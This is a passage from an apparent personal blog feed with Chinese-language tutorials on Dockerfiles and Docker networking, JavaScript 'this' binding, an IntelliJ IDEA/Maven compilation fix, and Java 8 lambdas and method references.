class="line">docker build -f dockerfile1的文件地址 -t 目标镜像名称[:tag]  .		</span><br><span class="line">	<span class="comment"># 结尾的.符号，指的是在构建镜像的过程中的上下文环境的目录（比如在dockerfile文件中使用了copy等指令来操作文件，此处的.就指定了这些指令执行时的上下文环境地址）</span></span><br><span class="line">	<span class="comment">#挂载数据卷的目录在dockerfile的volume后面指定</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ --volumes-from实现容器之间的数据同步 ------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker run -it --name container02 --volumes-from container01 镜像:[tag]		</span><br><span class="line">	<span class="comment"># 通过--volumes-from做到两个容器之间的数据同步（同步挂载：son extend father）</span></span><br><span class="line">	<span class="comment"># 好处：多个容器时，只需挂载其中一个容器到数据卷，其余容器创建时只需要使用--volumes-from即可</span></span><br></pre></td></tr></table></figure>

<h2 id="DockerFile详解"><a href="#DockerFile详解" class="headerlink" title="DockerFile详解"></a>DockerFile详解</h2><p>构建发布镜像步骤：</p>
<ol>
<li>构建一个dockerfile文件</li>
<li>docker build构建成为一个镜像</li>
<li>docker run运行一个镜像</li>
<li>docker push发布镜像（DockerHub、阿里云镜像仓库）</li>
</ol>
<h3 id="构建Dockerfile文件"><a href="#构建Dockerfile文件" class="headerlink" title="构建Dockerfile文件"></a>构建Dockerfile文件</h3><table>
<thead>
<tr>
<th>关键字</th>
<th>作用</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>from</td>
<td>指定父镜像</td>
<td>指定dockerfile基于哪个image构建</td>
</tr>
<tr>
<td>maintainer</td>
<td>作者信息</td>
<td>表明作者（姓名+邮箱）</td>
</tr>
<tr>
<td>label</td>
<td>标签</td>
<td>表明dockerfile的标签，可以使用label代替maintainer，最终都是在docker image基本信息中可以查看</td>
</tr>
<tr>
<td>run</td>
<td>执行命令</td>
<td>执行一段命令，默认是/bin/bash<br />格式：run command 或者 run [“command”, “param1”, “param”]<br /><strong>run对docker容器造成的改变会反映到创建的镜像上</strong></td>
</tr>
<tr>
<td>cmd</td>
<td>容器启动命令</td>
<td>提供run容器时候的默认命令，和entrypoint配合使用<br />格式：cmd command param1 param2 或者cmd [“command”, “param1”, “param2”]<br />只有最后一个生效（一个dockerfile只有一个cmd）</td>
</tr>
<tr>
<td>entrypoint</td>
<td>入口</td>
<td>一般在制作一些执行就关闭的容器中使用</td>
</tr>
<tr>
<td>copy</td>
<td>复制文件</td>
<td>build时，复制文件到image中</td>
</tr>
<tr>
<td>add</td>
<td>添加文件</td>
<td>build时，添加文件到image中<br />不仅仅局限于当前build上下文，可以来源于远程服务</td>
</tr>
<tr>
<td>env</td>
<td>环境变量</td>
<td>指定build时候的环境变量<br />可以在启动的容器时，通过-e覆盖<br />格式：env name=value</td>
</tr>
<tr>
<td>arg</td>
<td>构建参数</td>
<td>只在构建时候使用的参数<br />env相同名字的变量会覆盖arg的同名变量</td>
</tr>
<tr>
<td>volume</td>
<td>定义外部可以挂载的数据卷</td>
<td>指定build的image哪些目录可以启动的时候挂载到文件系统中<br />启动容器时，使用-v绑定 <br />格式：volume [“目录”]</td>
</tr>
<tr>
<td>expose</td>
<td>暴露端口</td>
<td>定义容器运行时候监听的端口<br />启动容器时使用-p来绑定暴露端口<br />格式：expose 8080或者expose 8080/udp</td>
</tr>
<tr>
<td>workdir</td>
<td>工作目录</td>
<td>指定容器内部的工作目录，如果没有创建则自动创建，如果指定/使用的时绝对地址，如果不是/开头那么是在上一条workdir的路径的相对地址<br />主要为run、cmd、entrypoint、copy、add指定工作目录</td>
</tr>
<tr>
<td>user</td>
<td>指定执行用户</td>
<td>指定build或者启动的时候，用户在run cmd entrypoint执行的时候的用户<br /></td>
</tr>
<tr>
<td>healthcheck</td>
<td>健康检查</td>
<td>指定监测当前容器的健康监测的命令，基本没用，通常应用本身有健康监测机制</td>
</tr>
<tr>
<td>onbuild</td>
<td>触发器</td>
<td>当执行from完成之后会执行onbuild的命令<br />不影响当前镜像，用处不大</td>
</tr>
<tr>
<td>stopsignal</td>
<td>发送信号量到宿主机</td>
<td>该指令设置将发送到容器的系统调用信号以退出</td>
</tr>
<tr>
<td>shell</td>
<td>指定执行脚本的shell</td>
<td>指定run cmd entrypoint 执行命令的时候 使用的shell</td>
</tr>
</tbody></table>
<ul>
<li>workdir区别于docker build最后的path地址，前者指的时<strong>容器内的工作目录</strong>，后者是指镜像在构建过程中<strong>对主机中的资源操作时的上下文环境</strong></li>
<li>cmd和entrypoint区别<ul>
<li>cmd：指定这个容器启动时候要运行的命令，只有最后一个会生效，可替代</li>
<li>entrypoint：指定这个容器启动时候要运行的命令，可以追加命令</li>
</ul>
</li>
</ul>
<h3 id="Dockerfile案例"><a href="#Dockerfile案例" class="headerlink" title="Dockerfile案例"></a>Dockerfile案例</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM centos:7						<span class="comment"># 设置镜像使用的基础镜像</span></span><br><span class="line">MAINTAINER lixingze&lt;lixingzee@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">ENV MYPATH /user/<span class="built_in">local</span></span><br><span class="line">WORKDIR <span class="variable">$MYPATH</span>						<span class="comment"># docker run之后的工作目录</span></span><br><span class="line"></span><br><span class="line">RUN yum -y install vim				<span class="comment"># 安装vim到镜像中</span></span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="variable">$MYPATH</span></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">&quot;-----end-----&quot;</span></span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="Docker网路"><a href="#Docker网路" class="headerlink" title="Docker网路"></a>Docker网路</h2><p>容器之间可以互相ping通。</p>
<p>所有容器不指定网络情况下，都是docker0路由的，docker会给我们容器分配一个默认可用ip地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ip和网卡</span></span><br><span class="line">ip addr		<span class="comment"># 查看容器的内部网卡、ip地址（需要iproute2工具）</span></span><br><span class="line">或</span><br><span class="line">ifconfig	<span class="comment"># 查看容器的内部网卡、ip地址（需要net-tools工具）</span></span><br><span class="line"><span class="comment"># 如果命令找不到，安装net-tools、iproute2、iputils-ping（可以使用ping命令）</span></span><br></pre></td></tr></table></figure>

<p>每个容器带来的网卡都是一对一对的，只要删除容器，对应网桥一对就没了。</p>
<p>docker中所有网络接口都是虚拟的，虚拟的转发效率高！（内网传递文件）</p>
<p>docker使用的时Linux的桥接，宿主机中是一个docker同期的网桥docker0。</p>
<p><strong>docker0特点，默认，容器名不能访问， –link可以打通连接！（单向的，本质上在容器的hosts中增加了一个代理：<code>172.17.0.3 tomcat02 56140c84bab0</code>）</strong></p>
<p>所以，需要<strong>自定义网络！不使用Docker0！</strong></p>
<h3 id="自定义网络"><a href="#自定义网络" class="headerlink" title="自定义网络"></a>自定义网络</h3><p>网络模式：</p>
<ul>
<li>bridge：桥接模式，docker默认方式，自定义的网络也是bridge模式</li>
<li>none：不配置网络</li>
<li>host：和宿主机共享网络</li>
<li>container：容器网络联通（用的很好，局限大）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看</span></span><br><span class="line">docker network ls		<span class="comment"># 查看所有网络</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 例</span></span><br><span class="line">docker run -d -P --name tomcat01 tomcat</span><br><span class="line">docker run -d -P --name tomcat01 --net bridge tomcat		<span class="comment"># 默认就是bridge，而这个bridge就代表的docker0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义一个网络</span></span><br><span class="line">docker network create --driver 网络模式 --subnet 子网的网络号/子网掩码 --gateway 网关设置 网络名称			<span class="comment"># 创建一个自定义网络，指定网络模式、网络地址规定、网关地址、网络名称</span></span><br><span class="line">docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动容器（指定网络）</span></span><br><span class="line">docker run -d -P --name 容器名称 --net 网络名称 镜像文件	<span class="comment"># 启动一个容器，指明自定义的网络名称（若不指定，则默认是docker0），就可以通过容器名字实现容器之间的互相访问</span></span><br><span class="line"></span><br><span class="line">docker network inspect 容器id</span><br></pre></td></tr></table></figure>

<hr>
<blockquote>
<p> <em>等接触到集群的时候再继续更新docker中集群的知识</em></p>
</blockquote>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript中的this指向</title>
    <url>/2022/02/22/javascript%E4%B8%AD%E7%9A%84this%E6%8C%87%E5%90%91/</url>
    <content><![CDATA[<h2 id="this指向的全部情况"><a href="#this指向的全部情况" class="headerlink" title="this指向的全部情况"></a>this指向的全部情况</h2><span id="more"></span>

<p><strong>首先，明确一点：this的指向，只会在调用的时候才能确定</strong></p>
<h3 id="1）直接调用，指向全局（this不在函数中）"><a href="#1）直接调用，指向全局（this不在函数中）" class="headerlink" title="1）直接调用，指向全局（this不在函数中）"></a>1）直接调用，指向全局（this不在函数中）</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">this</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>打印结果</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/02/22/bs475QkFzZehyDR.png" alt="image-20220222175707495"></p>
<h3 id="2）this在函数中"><a href="#2）this在函数中" class="headerlink" title="2）this在函数中"></a>2）this在函数中</h3><p><strong>this的指向，只会在调用的时候才能确定</strong></p>
<p>如果函数执行时，没有所属对象，this则指向全局windows{}</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">    b:<span class="number">1</span>,</span><br><span class="line">    c:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//下面这个this，只有在执行的时候才能确定指向谁</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>)		<span class="comment">//在本程序中，该语句共被执行两次，一次有所属对象，一次没有所属对象</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span>&#123;	<span class="comment">//第一种：该函数没有所属对象（该函数并不是一个属性）</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        d()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//第二种</span></span><br><span class="line">a.c();	<span class="comment">//通过a调用函数c（c是a的一个属性）；a就是c的所属对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//也是第一种情况</span></span><br><span class="line"><span class="keyword">let</span> e = a.c;	<span class="comment">//e就是一个单纯的函数</span></span><br><span class="line">e();	<span class="comment">//执行e()的时候，e没有所属对象</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>打印结果</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/02/22/SEJk8Up7g6cebam.png" alt="image-20220222181208250"></p>
<h3 id="3-构造器中的-this：指向新对象"><a href="#3-构造器中的-this：指向新对象" class="headerlink" title="3) 构造器中的 this：指向新对象"></a>3) 构造器中的 this：指向新对象</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> b = a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> a()	<span class="comment">//构造函数通过new调用创建一个实例对象,指向这个实例对象</span></span><br><span class="line"><span class="keyword">new</span> b(); <span class="comment">//构造函数通过new调用创建一个实例对象,指向这个实例对象</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>打印结果</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/02/22/WySnC7XYR6Us1MF.png" alt="image-20220222181756834"></p>
<h3 id="4）apply、call能够改变this指向"><a href="#4）apply、call能够改变this指向" class="headerlink" title="4）apply、call能够改变this指向"></a>4）apply、call能够改变this指向</h3><p>无参数时或者传入null、undefined，指向window</p>
<p><strong>apply()、call()都是函数的方法：</strong></p>
<ul>
<li>若apply()、call()无参数时或者传入null、undefined,则指向windows</li>
<li>若apply()、call()有参数时，第一个参数就是apply()、call()函数的调用者函数的作用域</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> a()		<span class="comment">//使用new构造的时候，也会执行一遍函数</span></span><br><span class="line"></span><br><span class="line">a.apply(a)	<span class="comment">//改变了函数中的this指向，指向了传入的实参</span></span><br><span class="line">a.call(a)	<span class="comment">//改变了函数中的this指向，指向了传入的实参</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>打印结果</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/02/22/PjtW9wlQVIKSDfJ.png" alt="image-20220222183132710"></p>
]]></content>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>idea中使用maven不依赖其模板创建javaweb项目，java源文件夹不编译</title>
    <url>/2021/10/18/idea%E4%B8%AD%E4%BD%BF%E7%94%A8maven%E4%B8%8D%E4%BE%9D%E8%B5%96%E5%85%B6%E6%A8%A1%E6%9D%BF%E5%88%9B%E5%BB%BAjavaweb%E9%A1%B9%E7%9B%AE%EF%BC%8Cjava%E6%BA%90%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8D%E7%BC%96%E8%AF%91/</url>
    <content><![CDATA[<h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h2><span id="more"></span>

<p>今天在学习struts2过程中，遇到这样的问题：<strong>创建web项目时没有使用maven自带的模板，而是通过Add Framework Support…的方式，但是启动Tomcat后，发现Java文件夹下所有的文件都没编译，而且，项目只生成了out文件夹，没有target文件夹（主要是没有target文件夹）</strong></p>
<p><strong>上面的错误有时候会发生，也有时候不发生</strong></p>
<img src="https://i.loli.net/2021/10/18/vmDFLwjtbUJHpyW.png" alt="image-20211018201238526" style="zoom:50%;" />

<h2 id="遇错过程"><a href="#遇错过程" class="headerlink" title="遇错过程"></a>遇错过程</h2><img src="https://i.loli.net/2021/10/18/g3CXleVa91N4I5z.png" alt="image-20211018200432606" style="zoom:50%;" />

<img src="https://i.loli.net/2021/10/18/CQMcp1HFJa2bUkI.png" alt="image-20211018200323793" style="zoom:50%;" />

<img src="https://i.loli.net/2021/10/18/cO54aqt2VjGISvz.png" alt="image-20211018200458462" style="zoom:50%;" />

<img src="https://i.loli.net/2021/10/18/2fFOC5gw6Jt7Zsn.png" alt="image-20211018200614282" style="zoom:50%;" />

<img src="https://i.loli.net/2021/10/18/pIaiEUvhWXNek45.png" alt="image-20211018200712811" style="zoom:50%;" />

<img src="https://i.loli.net/2021/10/18/Tpk6iMzXyal2QrR.png" alt="image-20211018200816394" style="zoom:50%;" />

<img src="https://i.loli.net/2021/10/18/vmDFLwjtbUJHpyW.png" alt="image-20211018201238526" style="zoom:50%;" />

<h2 id="导致后果"><a href="#导致后果" class="headerlink" title="导致后果"></a>导致后果</h2><p>①在Tomcat运行Web项目的时候，会出现找不到类的错误，</p>
<p>②在Struts2的项目中，会出现Filter过滤器失败的错误</p>
<p><strong>总之，上面两个后果，都是由于java文件没有被编译</strong></p>
<h2 id="分析原因："><a href="#分析原因：" class="headerlink" title="分析原因："></a>分析原因：</h2><p><strong>错误原因：应该是由于后来add framework support的时候，有些东西，idea没有读取加载到，所以没有编译Java源文件</strong></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>解决方法有好多种，网上有好多感觉是通过修改artifact、module的路径来解决的，反正我也没有看明白，也就没有去尝试</p>
<p>我采取的方式为<strong>重新加载module，并重新指定module的功能特征（Facets）</strong></p>
<p>然后整理了一下思路，解决思路写的更明晰一点</p>
<p><img src="https://i.loli.net/2021/10/18/tYhzQ2VSv74icxK.png" alt="image-20211018202305727"></p>
<p><img src="https://i.loli.net/2021/10/18/GfSAUw9XCnbizsK.png" alt="image-20211018202351584"></p>
<p><img src="https://i.loli.net/2021/10/18/i2YCbuFWkoTgQm3.png" alt="image-20211018202503499"></p>
<p><img src="https://i.loli.net/2021/10/18/tdZSm8eVbHU4Qc5.png" alt="image-20211018202538600"></p>
<p><img src="https://i.loli.net/2021/10/18/DK8bmOSfRwd51W6.png" alt="image-20211018202551678"></p>
<p><img src="https://i.loli.net/2021/10/18/bzSvPnawDQeEA6k.png" alt="image-20211018202609122"></p>
<p><img src="https://i.loli.net/2021/10/18/A8oVEmMcdnBIuh5.png" alt="image-20211018202654718"></p>
<p><img src="https://i.loli.net/2021/10/18/Q68IS4p1bm2HTBP.png" alt="image-20211018202841025"></p>
]]></content>
      <tags>
        <tag>javaweb项目</tag>
        <tag>java源文件不编译</tag>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>java8新特性：方法引用(双冒号)、lambda表达式</title>
    <url>/2021/11/29/java8%E6%96%B0%E7%89%B9%E6%80%A7%EF%BC%9A%E5%8F%8C%E5%86%92%E5%8F%B7%E3%80%81lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="lambda表达式"><a href="#lambda表达式" class="headerlink" title="lambda表达式"></a>lambda表达式</h2><span id="more"></span>

<h3 id="重要特征"><a href="#重要特征" class="headerlink" title="重要特征"></a>重要特征</h3><p>以下是lambda表达式的重要特征:</p>
<ul>
<li><strong>可选类型声明：</strong>不需要声明参数类型，编译器可以统一识别参数值。</li>
<li><strong>可选的参数圆括号：</strong>一个参数无需定义圆括号，但多个参数需要定义圆括号。</li>
<li><strong>可选的大括号：</strong>如果主体包含了一个语句，就不需要使用大括号。</li>
<li><strong>可选的返回关键字：</strong>如果主体只有一个表达式返回值则编译器会自动返回值，大括号需要指定表达式返回了一个数值。</li>
</ul>
<p>将以上四大特征理解就差不多了</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><strong>总的来说，就一个功能：实现有唯一的抽象函数的接口</strong></p>
<ol>
<li><p>在使用接口的时候，一般我们需要再写一个实现类，来实现这个接口，然后才可以调用这个方法。但是有了lambda表达式之后，我们可以不写这个实现类，直接在需要调用的地方，使用lambda表达式来实现这个方法，然后直接调用就行（<strong>前提：该接口只有一个需要实现的方法</strong>）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">t</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">aaa</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//使用lambda表达式进行实现接口中方法</span></span><br><span class="line">    A a1 = () -&gt; System.out.println(<span class="string">&quot;jjj&quot;</span>);</span><br><span class="line">    <span class="comment">//直接调用就行</span></span><br><span class="line">    a1.t();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>在集合的forEach方法中，直接使用lambda函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">aaa</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    List l = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    l.forEach((a) -&gt; System.out.println(a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里之所以能够使用Lambda表达式，原理其实和第1点中一样</p>
<p>因为<strong>forEach方法</strong>其实是<strong>List的父类Collection的父类Iterable的一个方法</strong>，</p>
<p>而Iterable接口的这个forEach()的参数是<strong>Consumer类型</strong>，</p>
<p>而Consumer类型又<strong>只有一个抽象方法accept()</strong></p>
<p>所以此处<strong>本质上</strong>是使用lambda表达式实现这个Consumer类的<strong>唯一</strong>的抽象方法<strong>accept()</strong></p>
<p>（具体可参见JDK源码）</p>
</blockquote>
</li>
</ol>
<h2 id="方法引用（-双冒号）"><a href="#方法引用（-双冒号）" class="headerlink" title="方法引用（::双冒号）"></a>方法引用（::双冒号）</h2><p>看了很多博客，如果想要更正确的理解，还可以参考这篇博客：<a href="https://blog.csdn.net/lkforce/article/details/99682885">(22条消息) java中的方法引用_lkforce-CSDN博客_java方法引用</a></p>
<p>（感觉这篇讲的比较清晰了<img src="https://i.loli.net/2021/11/29/3fZ7AmGHjzlTgvr.png" alt="img">)</p>
<p>本博客可能会与上面那篇博客有些地方的分类不一样，但是本文看完之后，如果懂了原理，就都会懂得</p>
<p><strong>首先一句话：</strong></p>
<blockquote>
<p><strong>”::“双冒号运算符就是Java中的方法引用</strong></p>
</blockquote>
<h3 id="方法引用的种类"><a href="#方法引用的种类" class="headerlink" title="方法引用的种类"></a>方法引用的种类</h3><p>方法引用有四种，分别是：</p>
<ul>
<li>指向静态方法的引用</li>
<li>指向某个对象的实例方法的引用</li>
<li>指向某个类型的实例方法的引用</li>
<li>指向构造方法的引用</li>
</ul>
<table>
<thead>
<tr>
<th>种类</th>
<th>案例</th>
<th>Lambda表达式写法</th>
</tr>
</thead>
<tbody><tr>
<td>引用静态方法</td>
<td><code>ContainingClass::staticMethodName</code></td>
<td>x -&gt; String.valueOf(x)</td>
</tr>
<tr>
<td>对特定对象的实例方法的引用</td>
<td><code>containingObject::instanceMethodName</code></td>
<td>x -&gt; x.toString()</td>
</tr>
<tr>
<td>对特定类型的任意对象的实例方法的引用</td>
<td><code>ContainingType::methodName</code></td>
<td>() -&gt; x.toString()</td>
</tr>
<tr>
<td>对构造函数的引用</td>
<td><code>ClassName::new</code></td>
<td>() -&gt; new ArrayList&lt;&gt;()</td>
</tr>
</tbody></table>
<p><strong>注意：</strong>可以看到，::运算符调用方法的时候，都是<strong>没有写出参数列表</strong>的，但是JVM会自动地将参数进行传递</p>
<p><strong>！！！此表只是用来作参考，不重要！！！</strong></p>
<p><strong>！！！此表只是用来作参考，不重要！！！</strong></p>
<p><strong>！！！此表只是用来作参考，不重要！！！</strong></p>
<h4 id="使用前提"><a href="#使用前提" class="headerlink" title="使用前提"></a><strong>使用前提</strong></h4><p>调用的<strong>方法，必须是原本就已经存在</strong>的方法（而不是像lambda表达式那样自己再写个函数式接口来实现一个抽象方法的）</p>
<h4 id="本质"><a href="#本质" class="headerlink" title="本质"></a><strong>本质</strong></h4><p>在网上看到一个人见解是这样的，感觉说的很有道理“<strong>把方法引用还原成一个接口实现对象</strong>”</p>
<p><img src="https://i.loli.net/2021/11/29/vOUmJlEFxjzAgqB.png" alt="image-20211129213132551"></p>
<h4 id="传参过程"><a href="#传参过程" class="headerlink" title="传参过程"></a><strong>传参过程</strong></h4><p>（想了很久）我觉的应该是，在调用的时候，只需要<code>外面的语句，有赋值的含义就行了</code>（当然，这说法很不科学，仅为我个人的为了搞清楚具体的使用方法而编出来的），然后JVM就会<strong>根据</strong> <strong>方法的形参列表</strong>和<strong>外面的语句</strong>，自动进行传入参数。</p>
<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="静态方法语法"><a href="#静态方法语法" class="headerlink" title="静态方法语法"></a><strong>静态方法语法</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; list = Arrays.asList(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="string">&quot;cccc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//静态方法语法	ClassName::methodName</span></span><br><span class="line">    list.forEach(Demo::print);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String content)</span></span>&#123;</span><br><span class="line">    System.out.println(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="类实例方法语法"><a href="#类实例方法语法" class="headerlink" title="类实例方法语法"></a><strong>类实例方法语法</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; list = Arrays.asList(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="string">&quot;cccc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对象实例语法	instanceRef::methodName</span></span><br><span class="line">    list.forEach(<span class="keyword">new</span> Demo()::print);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String content)</span></span>&#123;</span><br><span class="line">    System.out.println(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="超类方法语法"><a href="#超类方法语法" class="headerlink" title="超类方法语法"></a><strong>超类方法语法</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Example</span> <span class="keyword">extends</span> <span class="title">BaseExample</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; list = Arrays.asList(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="string">&quot;cccc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对象的超类方法语法： super::methodName </span></span><br><span class="line">        list.forEach(<span class="keyword">super</span>::print);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String content)</span></span>&#123;</span><br><span class="line">        System.out.println(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="类构造器语法"><a href="#类构造器语法" class="headerlink" title="类构造器语法"></a><strong>类构造器语法</strong></h4><p>构造方法也是方法，构造方法引用实际上表示一个函数式接口中的唯一方法引用了一个类的构造放法，引用的是那个参数相同的构造方法</p>
<p>（在下面的案例中是：<code>TargetClass::new</code>引用了与接口<code>ImTheOne</code>中唯一的抽象方法的<code>ImTheOne</code>的参数列表一样的构造函数<code>public TargetClass(String a)&#123; oneString = a; &#125;</code>，来实现这个唯一的抽象方法；所以，然后我们就调用这个被实现过的抽象的方法，来构造实例了）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wbg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ImTheOne</span> </span>&#123;</span><br><span class="line">    <span class="function">TargetClass <span class="title">getTargetClass</span><span class="params">(String a)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TargetClass</span> </span>&#123;</span><br><span class="line">    String oneString;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TargetClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        oneString = <span class="string">&quot;default&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TargetClass</span><span class="params">(String a)</span> </span>&#123;</span><br><span class="line">        oneString = a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ImTheOne imTheOne = TargetClass::<span class="keyword">new</span>;</span><br><span class="line">        TargetClass targetClass = imTheOne.getTargetClass(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        System.out.println(targetClass.oneString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//相当于以下效果</span></span><br><span class="line">        ImTheOne imTheOne2 = (a) -&gt; <span class="keyword">new</span> TargetClass(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        TargetClass targetClass2 = imTheOne2.getTargetClass(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        System.out.println(targetClass2.oneString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>温馨提示（个人见解）：</strong>类构造器的用法感觉可读性真不高，所以本人是不建议使用的</p>
